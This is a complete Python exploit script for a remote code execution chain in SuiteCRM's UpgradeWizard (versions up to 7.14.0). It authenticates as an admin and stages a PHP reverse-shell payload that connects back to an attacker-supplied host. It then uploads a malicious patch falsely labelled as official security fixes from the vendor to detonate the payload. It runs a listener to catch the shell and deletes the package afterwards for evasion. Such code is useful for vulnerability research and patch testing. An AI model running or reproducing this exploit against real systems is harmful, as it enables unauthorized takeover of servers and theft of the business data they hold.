#/usr/bin/env python
#
# Exploit Title: RCE Exploit Chain via UpgradeWizard
# Author: navsec
# Security Blog: www.navsec.net
# Vulnerable Software : https://suitecrm.com/
#
# SuiteCRM <= v7.14.0 is vulnerable to a remote code execution (RCE) vulnerability affecting the upgrade wizard.
# A privileged user with access to the upgrade wizard can send a malformed request to arbitrarily write a PHP payload to a file
# in the upload directory. A malicious patch can then be staged to bypass module protections and detonate the staged payload for RCE.


import requests, argparse, zipfile, random, io, time, socket, os
from threading import Thread
from telnetlib import Telnet

class suitecrm:
        
    def requestHelper(self, path, method, data="", files=""):
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Referer': '%s/index.php' % self.url,
            'Connection': 'close',
        }
        if method == 'POST':
            response = self.session.post(url=self.url + path, headers=headers, data=data, files=files, verify=False)
        elif method == 'GET':
            response = self.session.get(url=self.url + path, headers=headers, files=files, verify=False)
        
        if response.text.__contains__('You do not have permission to access this module'):
            print("[X] User has insufficient privileges to Upgrade Module")
            exit()
        if response.history:
            if response.history[0].headers["Location"].__contains__('action=Login'):
                print("[X] Auth Error Detected - Aborting")
                exit()
        return response


    def stager(self):
        payload = '<?php\n$sock=fsockopen("%s",%s);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);\n?>' % (self.LHOST, self.LPORT)
        
        form_data = {
            'module' : 'UpgradeWizard',
            'action' : 'index',
            'step' : '2',
            'run' : 'upload',
            'upgrade_zip_escaped' : 'C:\\fakepath\\' + str(self.RID) +'-archive.zip'
        }

        file_data = {
            'upgrade_zip': (str(self.RID) + '-run', payload, "application/zip")
        }

        print("[+] Staging our payload - [%s-run]" % str(self.RID))
        resp = self.requestHelper('/index.php', 'POST', form_data, file_data)
        if resp.status_code == 200:
            print("[+] Payload Staged - [%s-run]" % str(self.RID))


    def detonate(self):
        print("[i] Building Malicious Package....")
        manifest_data = '''
        <?php
        require_once("upload/{0}-run");
        $manifest = array(
        'name' => 'Suitecrm Upgrade Patch',
        'description' => 'This patch will install important security fixes!',
        'author' => 'SalesAgility Ltd',
        'version' => '1.3.3.7',
        'published_date' => '2023-01-01',
        'type' => 'patch',
        'is_uninstallable' => false,
        'acceptable_suitecrm_versions' => array(
            'regex_matches' => array(
                '7.*'
            )
        ),
        );

        $installdefs = array(
        'id' => 'patch #{1}',
        'copy' => array(
            array(
            'from' => 'upload/changeme.aspx',
            'to' => 'upload/changeme.php',
            ),
        ),
        );
        '''.format(str(self.RID), str(self.RID))
        # Package manifest in an archive
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, "a", zipfile.ZIP_DEFLATED, False) as zip_file:
            for file_name, data in [('manifest.php', io.BytesIO(manifest_data.encode('utf-8')))]:
                zip_file.writestr(file_name, data.getvalue())
        with open('./' + str(self.RID) + '.zip', 'wb') as f:
            f.write(zip_buffer.getvalue())
        
        form_data = {
            'module': 'UpgradeWizard',
            'action': 'index',
            'step': '2',
            'run': 'upload',
            'upgrade_zip_escaped': 'C:\\fakepath\\' + str(self.RID) +'-archive.zip'
        }

        file_data = {
            'upgrade_zip': (str(self.RID) + '-archive.zip', open('./' + str(self.RID) + '.zip', 'rb'), "application/zip")
        }

        print("[+] Detonating Staged Payload...")
        resp = self.requestHelper('/index.php', 'POST', form_data, file_data)

    def cleanup(self):
        # Remove previously generated zip from local client
        try:
            os.remove('./' + str(self.RID) + '.zip')
        except:
            pass

        # Delete our malicious package from the install cache for evasion
        print('[i] Cleaning Up...')
        form_data = {
        'module': 'UpgradeWizard',
        'action': 'index',
        'step': '2',
        'run': 'delete',
        'install_file': 'upload%3A%2F%2Fupgrades%2Fpatch%2F{0}-archive.zip'.format(str(self.RID)),
        }
        resp = self.requestHelper('/index.php', 'POST', form_data)

    def getSessionToken(self, username, password):
        form_data = {
        'module': 'Users',
        'action': 'Authenticate',
        'return_module': 'Users',
        'return_action': 'Login',
        'cant_login': '',
        'login_module': 'Users',
        'login_action': '',
        'login_record': '',
        'login_token': '',
        'login_oauth_token': '',
        'login_mobile': '',
        'user_name': username,
        'username_password': password,
        'Login': 'Log In',
        }
        resp = self.requestHelper('/index.php', 'POST', form_data)
        return resp

    def __init__(self, url, LHOST, LPORT, username, password, cookie) -> None:
        self.LHOST = LHOST
        self.LPORT = LPORT
        self.url = url
        self.RID = random.randint(10000,50000)
        self.session = requests.Session()
        if (username and password):
            print("[i] Using User/Pass to Login...")
            self.getSessionToken(username, password)
        elif (cookie):
            self.cookie = cookie
            print("[i] Using Cookie Authentication...")
        else:
            exit("[X] Valid Credentials are Required!")



def handler(lport, rhost):
    print("[+] Starting handler on %s [+]" %lport)
    t = Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.bind(('0.0.0.0', lport))
        s.listen(1)
    except:
        print("[X] Couldn't Bind Listener on Provided Port. Try Another?")
        exit()
    
    conn, addr = s.accept()
    print("[+] Caught incoming shell from " + rhost + " [+]")
    time.sleep(2)
    print("[~~~] V SHELL OPENED V [~~~]")
    t.sock = conn
    t.interact()


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--url', '-b', required=True, dest='base_url', help='SuiteCRM Base URL')
    parser.add_argument('--LHOST', '-lh', required=True, dest='LHOST', help='Local Address to Serve Payload from')
    parser.add_argument('--LPORT', '-lp', required=True, dest='LPORT', help='Local Port to Serve Payload from')
    parser.add_argument('--user', '-u', required=False, dest='username', help='Admin Username')
    parser.add_argument('--pass', '-p', required=False, dest='password', help='Admin Password')
    parser.add_argument('--cookie', '-c', required=False, dest='cookie',help='Admin Cookie')
    args = parser.parse_args()

    client = suitecrm(args.base_url, args.LHOST, args.LPORT, args.username, args.password, args.cookie)

    # Start the handler and confirm we are ready to catch our shell
    client.stager()
    thr = Thread(target=handler, args=(int(args.LPORT), args.LHOST))
    thr.start()
    time.sleep(2)
    if thr.is_alive():
        time.sleep(1)
        client.detonate()
        client.cleanup()
    
